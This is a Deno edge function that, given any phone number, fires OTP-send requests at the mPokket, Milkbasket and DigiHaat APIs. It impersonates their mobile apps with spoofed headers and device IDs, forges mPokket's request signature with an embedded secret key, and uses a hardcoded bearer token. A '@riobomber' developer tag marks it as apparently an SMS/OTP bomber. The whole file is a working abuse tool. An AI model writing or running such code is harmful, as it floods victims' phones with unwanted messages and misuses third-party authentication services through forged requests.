import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const SECRET_KEY = '8I1Gpemb.iy,.)0oIyFd';
const MPOKKET_URL = 'https://api.mpokket.com/onboarding-mobile-bff/user-registration-service/registry/v1/otp/send';
const MILKBASKET_URL = 'https://consumerbff.milkbasket.com/graphql';
const DIGIHAAT_URL = 'https://prod.digihaat.in/clientApis/v2/auth/sendOTP';

async function sha512(message: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-512', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function handleMpokket(number: string, msg: string) {
  const hashKey = msg || 'OTP_REQUEST';
  const jsonBody = `{"appsflyerAdvertisingId":"1770282869593-3447693864921281146","googleAdvertisingId":"ccdc6909-4cd2-4c7d-a24f-ee0c31ce6453","hashKey":"${hashKey}","mobileNumber":"${number}"}`;
  const signature = await sha512(SECRET_KEY + jsonBody);

  const response = await fetch(MPOKKET_URL, {
    method: 'POST',
    headers: {
      'Host': 'api.mpokket.com',
      'x-signature': signature,
      'app-version': '4.3.1',
      'Content-Type': 'application/json; charset=UTF-8',
      'Accept-Encoding': 'gzip',
      'User-Agent': 'okhttp/4.12.0',
    },
    body: jsonBody,
  });

  const text = await response.text();
  let data;
  try { data = JSON.parse(text); } catch { data = { raw: text }; }
  return { success: response.ok, status_code: response.status, data, api_name: 'mpokket' };
}

async function handleMilkbasket(number: string, appHash: string) {
  const body = JSON.stringify({
    operationName: "registerNumber",
    variables: {
      phone: number,
      retry: true,
      retryType: "",
      appHash: appHash || "default",
      udid: "u7eNaxmozCa60ww1",
    },
    query: "mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) {\n  registerPhoneNumber(\n    phone: $phone\n    retry: $retry\n    retryType: $retryType\n    appHash: $appHash\n    udid: $udid\n  ) {\n    status\n    error\n    errorMsg\n    otpBlockTime\n    __typename\n  }\n}",
  });

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);

  const response = await fetch(MILKBASKET_URL, {
    method: "POST",
    headers: {
      "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 8 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/json",
      "authorization": "",
      "binaryversion": "8.1.0",
      "hubid": "1",
      "cityid": "1",
      "mblitetype": "0",
      "appversion": "8.1.0.0",
      "appplatform": "android",
      "role": "1",
      "mbexpress": "0",
      "origin": "https://www.milkbasket.com",
      "referer": "https://www.milkbasket.com/",
    },
    body,
    signal: controller.signal,
  });
  clearTimeout(timeoutId);

  const responseText = await response.text();
  let data;
  try { data = JSON.parse(responseText); } catch { data = { raw: responseText }; }
  data["developer"] = "@riobomber";
  return { success: response.ok, status_code: response.status, data, api_name: 'milkbasket' };
}

async function handleDigihaat(number: string, msg: string) {
  const body = JSON.stringify({
    appHash: msg || "hello",
    mobile: number,
  });

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 15000);

  const response = await fetch(DIGIHAAT_URL, {
    method: "POST",
    headers: {
      "User-Agent": "Mozilla/5.0 (Linux; Android 16; RMX3998 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.164 Mobile Safari/537.36",
      "Accept": "application/json",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Content-Type": "application/json",
      "devicename": "Mozilla/5.0 (Linux; Android 16; RMX3998 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.164 Mobile Safari/537.36",
      "deviceidentity": "9c0be5b6-b34b-4d4c-a2b5-041abebd5adb",
      "sec-ch-ua-platform": '"Android"',
      "authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiR1VFU1RfNmFjODk1MTItZTA4Zi00Y2M2LWFjMTItZjI3ZDg2ZTA3Yjk5IiwiaXNHdWVzdCI6dHJ1ZSwibGFuZ3VhZ2UiOiJlbiIsImlhdCI6MTc3NTA5MjA1NiwiZXhwIjoxODA2NjI4MDU2fQ.KTBt_mq_3NQeQ2SsOiOLRFPR_3ijthbo2S-_WOuYqhIW2GZ_peDfPFttgLEoOLjY2d8FODD_UhepuvI2rb2smZikfbVqJMf6dTVfBdBhWyWU9GCW8HHgCadDKhKPeq-ShQ_qn_laahjbSVXQ6vK_PXY_8lqUnE0Q_TV_EBI_l-DpPaNClPdE4iEj1QFMcED1r_oNH3VrOp1DqiFXNoGcq6PTXTCyFqQNeaNKj4h8p9vydLQF_CB63T68LfnoWPtaAFDMjq8_s7AQlRKe_RC04VxQOswCt_-t585t2jPnXHt3IEf_SqgG-i19Rr6XqCSRzBA9VDuPszz88TYU7u28oQ",
      "devicemanufacturer": "Google Inc.",
      "osversion": "Linux aarch64",
      "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Android WebView";v="146"',
      "sec-ch-ua-mobile": "?1",
      "web": "true",
      "devicemodel": "Mozilla/5.0 (Linux; Android 16; RMX3998 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.164 Mobile Safari/537.36",
      "origin": "https://www.digihaat.in",
      "referer": "https://www.digihaat.in/",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    },
    body,
    signal: controller.signal,
  });
  clearTimeout(timeoutId);

  const responseText = await response.text();
  let data;
  try { data = JSON.parse(responseText); } catch { data = { raw: responseText }; }
  data["developer"] = "@riobomber";
  return { success: response.ok, status_code: response.status, data, api_name: 'digihaat' };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const { number, msg, service } = await req.json();

    if (!number) {
      return new Response(JSON.stringify({ status: 'ERROR', message: 'Missing number' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    let result;
    switch (service) {
      case 'milkbasket':
        result = await handleMilkbasket(number, msg || '');
        break;
      case 'digihaat':
        result = await handleDigihaat(number, msg || '');
        break;
      case 'mpokket':
      default:
        result = await handleMpokket(number, msg || '');
        break;
    }

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (err) {
    return new Response(JSON.stringify({
      success: false, status_code: 500,
      error_message: err instanceof Error ? err.message : 'Unknown error',
    }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
